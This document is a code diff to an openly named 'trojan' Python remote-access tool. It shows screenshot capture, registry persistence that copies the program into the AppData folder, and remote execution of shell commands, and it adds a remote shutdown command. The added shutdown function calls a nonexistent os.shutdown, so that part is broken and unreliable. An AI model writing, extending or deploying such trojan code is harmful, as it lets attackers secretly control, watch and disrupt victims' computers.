@@ -45,7 +45,9 @@ def trojan():
     def screenshot():
         myScreenshot = pyautogui.screenshot()
         myScreenshot.save('screen.png')
-
+    def shutdown():
+        os.shutdown("shutdown /s /t 1")
+        
     def persist(reg_name, copy_name):
         file_location = os.environ['appdata'] + '\\' + copy_name
         try:
@@ -105,6 +107,8 @@ def trojan():
             elif command[:11] == 'persistence':
                 reg_name, copy_name = command[12:].split(' ')
                 persist(reg_name, copy_name)
+            elif command == 'shutdown':
+                shutdown()
             elif command[:7] == 'sendall':
                 subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin = subprocess.PIPE)
             else:
